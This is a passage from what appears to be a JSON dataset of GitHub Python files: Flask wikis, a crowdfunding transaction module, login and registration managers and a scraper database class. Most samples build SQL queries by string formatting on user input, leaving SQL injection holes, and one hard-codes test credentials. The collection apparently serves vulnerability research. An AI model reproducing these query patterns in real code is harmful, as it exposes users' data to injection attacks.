\"update\":\n        db.update(\n            \"page\", {\n                \"id\": id,\n                \"page_content\": page_content,\n                \"author_name\": author_name,\n                \"last_mod_date\": last_mod_time,\n                \"version_number\": int(version_number) + 1\n            }\n        )\n    elif action == \"create\":\n        db.insert (\n            \"page\",\n            title = page_name,\n            page_content = page_content,\n            author_name = author_name,\n            last_mod_date = last_mod_time,\n            version_number = 1\n        )\n    else:\n        pass\n    return redirect(\"/%s\" % page_name)\n\n@app.route(\"/AllPages\")\ndef all_pages():\n    all_pages_query = db.query(\"select title from page order by title;\").namedresult()\n    print \"\\n\\nAll pages query: %r\\n\\n\" % all_pages_query\n    return render_template(\n        \"allpages.html\",\n        all_pages_query = all_pages_query\n    )\n\n@app.route(\"/search\", methods = [\"POST\"])\ndef search_pages():\n    search = request.form.get(\"search\")\n    page = db.query(\"select title from page where title = '%s'\" % search).namedresult()\n    if len(page) == 0:\n        return redirect(\"/%s\" % search)\n    else:\n        return place_holder(search)\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/JLucka/kickstarter-dev/blob/b6ff119c7653b326206e8fd4115f51fee2719bcf",
        "file_path": "/backend/transactions/TransactionConnector.py",
        "source": "import datetime\n\nimport MySQLdb\n\nfrom backend.SQLConnector import SQLConnector\n\nTABLE_NAME = \"transactions\"\n\n\nclass Transaction:\n    def __init__(self, project_id, user_id, money):\n        self.project_id = project_id\n        self.user_id = user_id\n        self.money = money\n        self.time = datetime.datetime.now().isoformat(' ')\n\n    def to_json_obj(self):\n        obj = {\n            'id': self.id,\n            'project_id': self.project_id,\n            'user_id': self.user_id,\n            'money': self.money,\n            'time': self.time\n            }\n        return obj\n\n    def to_database_query(self):\n        data = [self.project_id, self.user_id, self.money, self.time]\n        data = [repr(x) for x in data]\n        labels = [\"project_id\", \"user_id\", \"money\", \"timestamp\"]\n        return dict(zip(labels, data))\n\n\nclass TransactionConnector(SQLConnector):\n    def __init__(self):\n        SQLConnector.__init__(self)\n        self.table_name = TABLE_NAME\n\n    def insert_into(self, transaction):\n        return SQLConnector.insert_into(self, transaction.to_database_query())\n\n    def support_project(self, user_id, project_id, money):\n        try:\n            if self.can_user_pass_that_amount_of_money(user_id, money) \\\n                    and self.check_if_this_project_is_in_database(project_id):\n                self.save_accepted_transaction(user_id, project_id, money)\n                return True\n            else:\n                self.save_failure_transaction(user_id, project_id, money)\n        except MySQLdb.Error:\n            self.db.rollback()\n        return False\n\n    def save_accepted_transaction(self, user_id, project_id, money):\n        self.cursor.execute(\"update users set money = money - %s where id = %s\"%(money, user_id))\n        self.cursor.execute(\"update projects set money = money + %s where id = %s\" % (money, project_id))\n        self.cursor.execute(\"insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )\" % (project_id, user_id, money))\n        self.db.commit()\n\n    def save_failure_transaction(self, user_id, project_id, money):\n        self.cursor.execute(\"insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )\" % (project_id, user_id, money))\n        self.db.commit()\n\n    def check_if_this_project_is_in_database(self, project_id):\n        self.cursor.execute(\"SELECT count(id) FROM projects where id = %s\" % project_id)\n        return self.cursor.fetchall()[0][0] == 1\n\n    def can_user_pass_that_amount_of_money(self, user_id, money):\n        self.cursor.execute(\"SELECT count(id) FROM kickstarter.users where id = %s and money >= %s\" % (user_id, money))\n        return self.cursor.fetchall()[0][0]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/JLucka/kickstarter-dev/blob/991b8b26f19b287f61997eee7b26855ce0176daa",
        "file_path": "/backend/transactions/TransactionConnector.py",
        "source": "import datetime\n\nimport MySQLdb\n\nfrom backend.SQLConnector import SQLConnector\n\nTABLE_NAME = \"transactions\"\n\n\nclass Transaction:\n    def __init__(self, project_id, user_id, money):\n        self.project_id = project_id\n        self.user_id = user_id\n        self.money = money\n        self.time = datetime.datetime.now().isoformat(' ')\n\n    def to_json_obj(self):\n        obj = {\n            'id': self.id,\n            'project_id': self.project_id,\n            'user_id': self.user_id,\n            'money': self.money,\n            'time': self.time\n            }\n        return obj\n\n    def to_database_query(self):\n        data = [self.project_id, self.user_id, self.money, self.time]\n        data = [repr(x) for x in data]\n        labels = [\"project_id\", \"user_id\", \"money\", \"timestamp\"]\n        return dict(zip(labels, data))\n\n\nclass TransactionConnector(SQLConnector):\n    def __init__(self):\n        SQLConnector.__init__(self)\n        self.table_name = TABLE_NAME\n\n    def insert_into(self, transaction):\n        return SQLConnector.insert_into(self, transaction.to_database_query())\n\n    def support_project(self, user_id, project_id, money):\n        try:\n            if self.can_user_pass_that_amount_of_money(user_id, money) \\\n                    and self.check_if_this_project_is_in_database(project_id):\n                self.save_accepted_transaction(user_id, project_id, money)\n                return True\n            else:\n                self.save_failure_transaction(user_id, project_id, money)\n        except MySQLdb.Error:\n            self.db.rollback()\n        return False\n\n    def save_accepted_transaction(self, user_id, project_id, money):\n        self.cursor.execute(\"update users set money = money - %s where id = %s\"%(money, user_id))\n        self.cursor.execute(\"update projects set money = money + %s where id = %s\" % (money, project_id))\n        self.cursor.execute(\"insert into transactions (project_id, user_id, money, timestamp, state) values (%s, %s, %s, now(), 'accepted' )\" % (project_id, user_id, money))\n        self.db.commit()\n\n    def save_failure_transaction(self, user_id, project_id, money):\n        self.cursor.execute(\"insert into transactions (project_id,user_id, money, timestamp, state) values (%s, %s, %s, now(), 'failed' )\" % (project_id, user_id, money))\n        self.db.commit()\n\n    def check_if_this_project_is_in_database(self, project_id):\n        self.cursor.execute(\"SELECT count(id) FROM projects where id = %s\" % project_id)\n        return self.cursor.fetchall()[0][0] == 1\n\n    def can_user_pass_that_amount_of_money(self, user_id, money):\n        self.cursor.execute(\"SELECT count(id) FROM kickstarter.users where id = %s and money >= %s\" % (user_id, money))\n        return self.cursor.fetchall()[0][0]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Pumala/python_wiki_app_redo/blob/be3c3331127df21b6887f51a60cbadda7553baef",
        "file_path": "/server.py",
        "source": "from flask import Flask, render_template, redirect, request\nimport pg, markdown, time\nfrom time import strftime, localtime\nimport pg, markdown, time\nfrom wiki_linkify import wiki_linkify\n\napp = Flask('WikiApp')\n\ndb = pg.DB(dbname='wiki_db_redo')\n\n@app.route('/')\ndef render_homepage():\n    return render_template(\n        'homepage.html'\n    )\n\n@app.route('/<page_name>')\ndef render_page_name(page_name):\n    query = db.query(\"select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    wiki_page = query.namedresult()\n    has_content = False\n    page_is_taken = False\n    if len(wiki_page) < 1:\n        content = \"\"\n    else:\n        page_is_taken = True\n        content = wiki_page[0].content\n    if len(content) > 0:\n        has_content = True\n    else:\n        pass\n    content = markdown.markdown(wiki_linkify(content))\n    return render_template(\n        'pageholder.html',\n        page_is_taken = page_is_taken,\n        page_name = page_name,\n        markdown = markdown,\n        wiki_linkify = wiki_linkify,\n        has_content = has_content,\n        content = content\n    )\n\n@app.route('/<page_name>/edit')\ndef render_page_edit(page_name):\n    query = db.query(\"select page_content.content from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    wiki_page = query.namedresult()\n    if len(wiki_page) > 0:\n        content = wiki_page[0].content\n    else:\n        content = \"\"\n    return render_template(\n        'edit_page.html',\n        page_name = page_name,\n        content = content\n    )\n\n@app.route('/<page_name>/save', methods=['POST'])\ndef save_page_edit(page_name):\n    # grab the new content from the user\n    content = request.form.get('content')\n    # check if 'page_name' exists in the database\n    query = db.query(\"select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    result = query.namedresult()\n    # if it doesn't exist, create a new page in the database\n    if len(result) < 1:\n        db.insert(\n            'page', {\n                'page_name': page_name\n            }\n        )\n    else:\n        pass\n    # now that we're certain that the page exists in the database, we again grab the query\n    # and insert new content in the database\n    query = db.query(\"select id from page where page_name = '%s'\" % page_name)\n    page_id = query.namedresult()[0].id\n    db.insert(\n        'page_content', {\n            'page_id': page_id,\n            'content': content,\n            'timestamp': time.strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n        }\n    )\n    return redirect(\"/%s\" % page_name)\n\n@app.route('/search', methods=['POST'])\ndef redirect_search():\n    search = request.form.get('search')\n    return redirect('/%s' % search)\n\n@app.route('/<page_name>/history')\ndef view_page_history(page_name):\n    query = db.query(\"select page_content.timestamp, page_content.id from page, page_content where page.id = page_content.page_id and page.page_name = '%s'\" % page_name)\n    page_histories = query.namedresult()\n\n    return render_template(\n        'page_history.html',\n        page_name = page_name,\n        page_histories = page_histories\n    )\n\n@app.route('/<page_name>/history/record')\ndef view_page_record(page_name):\n    content_id = request.args.get('id')\n    query = db.query(\"select page_content.content, page_content.timestamp from page, page_content where page.id = page_content.page_id and page_content.id = '%s'\" % content_id)\n    page_record = query.namedresult()[0]\n\n    return render_template(\n        'page_record.html',\n        page_name = page_name,\n        page_record = page_record\n    )\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Pumala/python_wiki_app_redo/blob/65d60747cd8efb05970304234d3bd949d2088e8b",
        "file_path": "/server_orig.py",
        "source": "from flask import Flask, render_template, redirect, request\nimport pg, markdown, time\nfrom time import strftime, localtime\nimport pg, markdown, time\nfrom wiki_linkify import wiki_linkify\n\napp = Flask('WikiApp')\n\ndb = pg.DB(dbname='wiki_db_redo')\n\n@app.route('/')\ndef render_homepage():\n    return render_template(\n        'homepage.html'\n    )\n\n@app.route('/<page_name>')\ndef render_page_name(page_name):\n    query = db.query(\"select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    wiki_page = query.namedresult()\n    has_content = False\n    page_is_taken = False\n    if len(wiki_page) < 1:\n        content = \"\"\n    else:\n        page_is_taken = True\n        content = wiki_page[0].content\n    if len(content) > 0:\n        has_content = True\n    else:\n        pass\n    content = markdown.markdown(wiki_linkify(content))\n    return render_template(\n        'pageholder.html',\n        page_is_taken = page_is_taken,\n        page_name = page_name,\n        markdown = markdown,\n        wiki_linkify = wiki_linkify,\n        has_content = has_content,\n        content = content\n    )\n\n@app.route('/<page_name>/edit')\ndef render_page_edit(page_name):\n    query = db.query(\"select page_content.content from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    wiki_page = query.namedresult()\n    if len(wiki_page) > 0:\n        content = wiki_page[0].content\n    else:\n        content = \"\"\n    return render_template(\n        'edit_page.html',\n        page_name = page_name,\n        content = content\n    )\n\n@app.route('/<page_name>/save', methods=['POST'])\ndef save_page_edit(page_name):\n    # grab the new content from the user\n    content = request.form.get('content')\n    # check if 'page_name' exists in the database\n    query = db.query(\"select page_content.content, page.id as page_id, page_content.id as content_id from page, page_content where page.id = page_content.page_id and page.page_name = '%s' order by page_content.id desc limit 1\" % page_name)\n    result = query.namedresult()\n    # if it doesn't exist, create a new page in the database\n    if len(result) < 1:\n        db.insert(\n            'page', {\n                'page_name': page_name\n            }\n        )\n    else:\n        pass\n    # now that we're certain that the page exists in the database, we again grab the query\n    # and insert new content in the database\n    query = db.query(\"select id from page where page_name = '%s'\" % page_name)\n    page_id = query.namedresult()[0].id\n    db.insert(\n        'page_content', {\n            'page_id': page_id,\n            'content': content,\n            'timestamp': time.strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n        }\n    )\n    return redirect(\"/%s\" % page_name)\n\n@app.route('/search', methods=['POST'])\ndef redirect_search():\n    search = request.form.get('search')\n    return redirect('/%s' % search)\n\n@app.route('/<page_name>/history')\ndef view_page_history(page_name):\n    query = db.query(\"select page_content.timestamp, page_content.id from page, page_content where page.id = page_content.page_id and page.page_name = '%s'\" % page_name)\n    page_histories = query.namedresult()\n\n    return render_template(\n        'page_history.html',\n        page_name = page_name,\n        page_histories = page_histories\n    )\n\n@app.route('/<page_name>/history/record')\ndef view_page_record(page_name):\n    content_id = request.args.get('id')\n    query = db.query(\"select page_content.content, page_content.timestamp from page, page_content where page.id = page_content.page_id and page_content.id = '%s'\" % content_id)\n    page_record = query.namedresult()[0]\n\n    return render_template(\n        'page_record.html',\n        page_name = page_name,\n        page_record = page_record\n    )\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/AnetaStoycheva/Programming101_HackBulgaria/blob/db471c09944ddc8f3fd39f9644c1d2f92276490b",
        "file_path": "/Week_9/sql_manager.py",
        "source": "import sqlite3\nfrom Client import Client\nimport create_database\n\n\nclass SqlManager:\n    def __init__(self, conn):\n        self.__conn = conn\n\n    def change_message(self, new_message, logged_user):\n        update_sql = \"\"\"\n            UPDATE Clients\n            SET message = '{}'\n            WHERE client_id = '{}'\n        \"\"\".format(new_message, logged_user.get_client_id())\n\n        cursor = self.__conn.cursor()\n\n        cursor.execute(update_sql)\n        self.__conn.commit()\n        logged_user.set_message(new_message)\n\n    def change_pass(self, new_pass, logged_user):\n        update_sql = \"\"\"\n            UPDATE Clients\n            SET password = '{}'\n            WHERE client_id = '{}'\n        \"\"\".format(new_pass, logged_user.get_client_id())\n\n        cursor = self.__conn.cursor()\n\n        cursor.execute(update_sql)\n        self.__conn.commit()\n\n    def register(self, username, password):\n        insert_sql = \"\"\"\n            INSERT INTO Clients (username, password)\n            VALUES ('{}', '{}')\n        \"\"\".format(username, password)\n\n# Da ne pravi registraciq, ako imeto ve4e e zaeto!!!\n\n        cursor = self.__conn.cursor()\n\n        cursor.execute(insert_sql)\n        self.__conn.commit()\n\n    def login(self, username, password):\n        select_query = \"\"\"\n            SELECT client_id, username, balance, message\n            FROM Clients\n            WHERE username = '{}' AND password = '{}'\n            LIMIT 1\n        \"\"\".format(username, password)\n\n        cursor = self.__conn.cursor()\n\n        cursor.execute(select_query)\n        user = cursor.fetchone()\n\n        if(user):\n            return Client(user[0], user[1], user[2], user[3])\n        else:\n            return False\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jboludae/FSND_tournament_results/blob/0131a6c490a0c8dfe35cd15096712f0f671832f9",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n# \n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nimport bleach\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    conn = connect()\n    c = conn.cursor()\n    c.execute(\"delete from matches\")\n    conn.commit()\n    conn.close()\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    conn = connect()\n    c = conn.cursor()\n    c.execute(\"delete from players\")\n    conn.commit()\n    conn.close()\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    conn = connect()\n    c = conn.cursor()\n    c.execute(\"select count(*) from players\")\n    results = c.fetchone()\n    conn.close()\n    return int(results[0])\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n  \n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n  \n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n    name = bleach.clean(name)\n    conn = connect()\n    c = conn.cursor()\n    # -->(%s ,0 ,0)\",(name,)<-- this syntax is important to ' are inserted safely\n    c.execute(\"insert into players (name_player) values (%s)\",(name,))\n    conn.commit()\n    conn.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    conn = connect()\n    c = conn.cursor()\n    c.execute(\"select * from ranking order by count_wins desc\")\n    results = c.fetchall()\n    conn.commit()\n    conn.close()\n    return results\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    conn = connect()\n    c = conn.cursor()\n    # Insert match into matches table\n    c.execute(\"insert into matches (winner, loser) values ({0},{1})\".format(winner, loser))\n    conn.commit()\n\n    conn.close()\n \n \ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n  \n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n  \n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    conn = connect()\n    c = conn.cursor()\n    c.execute(\"select * from ranking order by count_wins desc\")\n    players_list = c.fetchall()\n    num_games = len(players_list)/2\n    result = []\n\n    for game in range(num_games):\n        first_player_index = game*2\n        second_player_index = first_player_index + 1\n        first_player_tuple = players_list[first_player_index]\n        second_player_tuple = players_list[second_player_index]\n        result.append((first_player_tuple[0], first_player_tuple[1], second_player_tuple[0], second_player_tuple[1]))\n    conn.close()\n    return result\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/piercecunneen/ND-Class-Info-and-Teacher-Ratings-website/blob/2c899e8717f745c07c2f4a2a9d13571c6f18bed9",
        "file_path": "/password.py",
        "source": "import sqlite3\nfrom passlib.hash import pbkdf2_sha256\n\ndb_path = \"reviews.sqlite\"\n\ndef create_user(username, password):\n    \n    # check for nd.edu email\n    address = username[-6:-1] + username[len(username) - 1]\n    if address == \"nd.edu\":\n        # check for existence of username already\n\n        conn = sqlite3.connect(db_path)\n        with conn:\n            c = conn.cursor()\n            sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n            c.execute(sql)\n            user = c.fetchone()\n            if user:\n                return False, \"User already exists\"\n            else: # add user to the db\n                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n                sql = 'insert into userInfo values(\"' + username + '\", \"' + pass_hash + '\")'\n                c.execute(sql)\n                return True, \"User created successfully\"\n\n    else:\n        return False, \"Please register with a valid nd.edu email address\" \n\ndef change_password(username, password):\n    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"update userInfo set password = '\" + str(pass_hash) + \"' where username = '\" + str(username) + \"'\"\n        c.execute(sql)\n        \n\n        \ndef validate_user(username, password):\n    \n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n        c.execute(sql)\n        user = c.fetchone()\n    \n    if user is None:\n        return False, \"Username not found\"\n    \n    if pbkdf2_sha256.verify(password, user[1]):\n        return True, \"Login Successful\"\n    else:\n        return False, \"Incorrect password\"\n    ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/piercecunneen/ND-Class-Info-and-Teacher-Ratings-website/blob/df12c7fc9ae2ee0165f56c6fc2c9202b7dd0833e",
        "file_path": "/password.py",
        "source": "import sqlite3\nfrom passlib.hash import pbkdf2_sha256\n\ndb_path = \"reviews.sqlite\"\n\ndef create_user(username, password):\n    \n    # check for nd.edu email\n    address = username[-6:-1] + username[len(username) - 1]\n    if address == \"nd.edu\":\n        # check for existence of username already\n\n        conn = sqlite3.connect(db_path)\n        with conn:\n            c = conn.cursor()\n            sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n            c.execute(sql)\n            user = c.fetchone()\n            if user:\n                return False, \"User already exists\"\n            else: # add user to the db\n                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n                sql = 'insert into userInfo values(\"' + username + '\", \"' + pass_hash + '\")'\n                c.execute(sql)\n                return True, \"User created successfully\"\n\n    else:\n        return False, \"Please register with a valid nd.edu email address\" \n\ndef change_password(username, password):\n    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"update userInfo set password = '\" + str(pass_hash) + \"' where username = '\" + str(username) + \"'\"\n        c.execute(sql)\n        \n\n        \ndef validate_user(username, password):\n    \n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n        c.execute(sql)\n        user = c.fetchone()\n    \n    if user is None:\n        return False, \"Username not found\"\n    \n    if pbkdf2_sha256.verify(password, user[1]):\n        return True, \"Login Successful\"\n    else:\n        return False, \"Incorrect password\"\n    ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/piercecunneen/ND-Class-Info-and-Teacher-Ratings-website/blob/e5a057daf0b9c68698f17b591daf8e4fc925ec4b",
        "file_path": "/password.py",
        "source": "import sqlite3\nfrom passlib.hash import pbkdf2_sha256\n\ndb_path = \"reviews.sqlite\"\n\ndef create_user(username, password):\n    \n    # check for nd.edu email\n    address = username[-6:-1] + username[len(username) - 1]\n    if address == \"nd.edu\":\n        # check for existence of username already\n\n        conn = sqlite3.connect(db_path)\n        with conn:\n            c = conn.cursor()\n            sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n            c.execute(sql)\n            user = c.fetchone()\n            if user:\n                return False, \"User already exists\"\n            else: # add user to the db\n                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n                sql = 'insert into userInfo values(\"' + username + '\", \"' + pass_hash + '\")'\n                c.execute(sql)\n                return True, \"User created successfully\"\n\n    else:\n        return False, \"Please register with a valid nd.edu email address\" \n\ndef change_password(username, password):\n    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)\n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"update userInfo set password = '\" + str(pass_hash) + \"' where username = '\" + str(username) + \"'\"\n        c.execute(sql)\n        \n\n        \ndef validate_user(username, password):\n    \n    conn = sqlite3.connect(db_path)\n    with conn:\n        c = conn.cursor()\n        sql = \"select * from userInfo where username = \" + \"'\" + username + \"'\" \n        c.execute(sql)\n        user = c.fetchone()\n    \n    if user is None:\n        return False, \"Username not found\"\n    \n    if pbkdf2_sha256.verify(password, user[1]):\n        return True, \"Login Successful\"\n    else:\n        return False, \"Incorrect password\"\n    ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jappe999/WebScraper/blob/e5536b6b7ae27f1d52061897790c898fd1f8a4a6",
        "file_path": "/beta/database.py",
        "source": "import pymysql, re\nfrom threading import Thread\nfrom sys import exit\n\nclass Database(object):\n    def __init__(self, user, password, database):\n        try:\n            self.db = pymysql.connect (\n                        host=\"127.0.0.1\",\n                        port=3306,\n                        user=user,\n                        password=password,\n                        db=database\n                      )\n            self.cursor = self.db.cursor()\n        except Exception as e:\n            print(e)\n            exit()\n\n    def getQueue(self, numberOfLinks=10):\n        self.cursor.execute(\"SELECT url FROM queue WHERE visited = '0' LIMIT {};\".format(numberOfLinks))\n        result = self.cursor.fetchall()\n        self.remove(result)\n        return result\n\n\n    def writeToDb(self, url):\n        try:\n            self.cursor.execute(\"INSERT INTO queue (url, visited) VALUES ('{}', '0');\".format(url))\n            self.db.commit()\n        except Exception as e:\n            print(e)\n\n    def setQueue(self, obj):\n        for url in obj:\n            t = Thread(target=self.writeToDb(url))\n            t.daemon = True\n            t.start()\n        return True\n\n    def remove(self, obj):\n        sql = \"UPDATE queue SET visited='1' WHERE url = '{}';\"\n        for line in obj:\n            url = re.sub(\"[\\(\\)\\']\", \"\", line[0])\n            t = Thread(target=self.execute(sql.format(url)))\n            t.daemon = True\n            t.start()\n\n    def clear(self):\n        self.cursor.execute(\"DELETE FROM queue;\")\n\n    def execute(self, command):\n        self.cursor.execute(command)\n        self.db.commit()\n\n    def close(self):\n        self.db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ZerolinK/NewDepartmentNotifier/blob/09c2d573d5c8d7a8fc169f925485df4fd70977de",
        "file_path": "/databaseConnectivity/databaseController.py",
        "source": "import mysql.connector\nfrom werkzeug.security import generate_password_hash, check_password_hash\n\nclass DatabaseController(object):\n        def __init__(self, connection_address, connection_port, user_name, password, database):\n                self.connection = mysql.connector.connect(host = connection_address, user=user_name, password = password, db = database)\n                self.cursor = self.connection.cursor(buffered=True)\n        def create_junk_table(self):\n                query = \"CREATE TABLE IF NOT EXISTS DPNET(why_mySQL int)\"\n                self.cursor.execute(query)\n                self.connection.commit()\n        def destroy_junk_table(self):\n                query = \"DROP TABLE IF EXISTS DPNET\"\n                self.cursor.execute(query)\n                self.connection.commit()\n\n        def verify_account(self, email, user_password):\n                query = \"SELECT Pass FROM user WHERE Email = '\" + email +\"'\"\n                self.cursor.execute(query)\n                fetch = self.cursor.fetchone()\n                password = \" \".join(map(str, fetch))\n                return check_password_hash(password, user_password)\n\n        def set_report(self, reportID, userID, summary, description):\n                query = \"INSERT INTO `testdb`.`report` (`Report_ID`, `User_ID`, `Summary`, `Description`, `Votes`, `Is_Resolved`) VALUES ('\" + reportID + \"', '\" + userID + \"', '\" + summary + \"', '\" + description + \"', '0', '0')\"\n                self.cursor.execute(query)\n                self.connection.commit()\n\n        def increment_vote(self, reportID):\n                query1 = \"SELECT Votes FROM report WHERE Report_ID = '\" + reportID +\"'\"\n                self.cursor.execute(query1)\n                fetch = self.cursor.fetchone()\n                curVote = \" \".join(map(str, fetch))\n                intVote = int(curVote)\n                intVote = intVote + 1\n                query2 = \"UPDATE `testdb`.`report` SET `Votes` = '\" + str(intVote) + \"' WHERE `report`.`Report_ID` = \" + reportID\n                self.cursor.execute(query2)\n                self.connection.commit()\n\n        def get_vote(self, reportID):\n                query1 = \"SELECT Votes FROM report WHERE Report_ID = '\" + reportID +\"'\"\n                self.cursor.execute(query1)\n                fetch = self.cursor.fetchone()\n                curVote = \" \".join(map(str, fetch))\n                intVote = int(curVote)\n                return intVote\n\n        def resolve_issue(self, reportID):\n                query = \"UPDATE `testdb`.`report` SET `Is_Resolved` = '1' WHERE `report`.`Report_ID` = \" + reportID\n                self.cursor.execute(query)\n                self.connection.commit()\n\n        def get_report(self, reportID):\n                query = \"SELECT * FROM report WHERE Report_ID = \" + reportID \n                self.cursor.execute(query)\n                self.connection.commit()\n                fetch = self.cursor.fetchone()\n                report = \" \".join(map(str, fetch))\n                return report\n\n        def create_basic_user(self, userID, fName, lName, email, password):\n                password2 = generate_password_hash(password)\n                query = \"INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('\" + userID + \"', '\" + fName + \"', '\" + lName + \"', '\" + email +\"', '\" + password2 + \"', '0')\"\n                self.cursor.execute(query)\n                self.connection.commit()\n\n        def create_faculty_user(self, userID, fName, lName, email, password):\n                password2 = generate_password_hash(password)\n                query = \"INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('\" + userID + \"', '\" + fName + \"', '\" + lName + \"', '\" + email +\"', '\" + password2 + \"', '1')\"\n                self.cursor.execute(query)\n                self.connection.commit()\n        \n        def close_connection(self):\n                self.connection.close()\n        \ndbc = DatabaseController('localhost', 3306, 'testuser', 'test623', 'testdb')\ndbc.create_basic_user(\"1586390\", \"Daniel\", \"Gonzalez\", \"dgonz023@fiu.edu\", \"dpnet\")\nprint(dbc.verify_account(\"dgonz023@fiu.edu\", \"dpnet\"))\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ZerolinK/NewDepartmentNotifier/blob/09c2d573d5c8d7a8fc169f925485df4fd70977de",
        "file_path": "/server/mainController.py",
        "source": "import os\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on specified port\", type=int)\n\n\nclass BaseController(tornado.web.RequestHandler):\n    def get_current_user(self):\n        return self.get_secure_cookie(\"username\")\n\n    #TODO: define this shit\n\nclass IndexController(tornado.web.RequestHandler):\n    def get(self):\n        self.render('index.html')#, user=self.current_user)\n    #TODO: define this shit\n\n'''class WebPageController(tornado.web.RequestHandler):'''\n    #TODO: define this shit\n\nclass LoginController(BaseController):\n    def get(self):\n        self.render(login.html)\n    def post(self):\n        self.set_secure_cookie(\"username\", self.get_argument(\"username\"))#passed from html with the tag username\n        #if PASSWORD is good, self.set_secure_cookie(username, self.get_argument(\"username\"))\n        self.redirect(\"/\", permanent=True)#if permanent = true, when user refreshes, more form data will NOT be sent\n    def get(self):\n        self.render('login.html')#login.html page to be rendered\n\n    class LogoutController(BaseController):\n        def get(self):\n            self.clear_cookie(\"username\")\n            self.redirect(\"/\", permanent = true)\n    #TODO: define this shit\"\"\"\n\nclass ReportController(BaseController):\n    def get(self):\n        self.render('report.html')\n        \n    class NewReportController(BaseController):\n        @tornado.web.authenticated\n        def get(self):\n            self.render('create.html')\n\t    #ADDED by Jimmy and david, incomplete sample code\n\t    #def post(self):\n\t    #\tvariable_1 = self.get_argument(\"form variable name here\")\n\t    #\t....\n\t    #\tif PASSWORD is good, self.set_secure_cookie(username, self.get_argument(\"username\"))'''\n\n\t        #put appropriate fetches from template here and send to database\n\n'''class UserProfileController(BaseController):'''\n    #TODO: 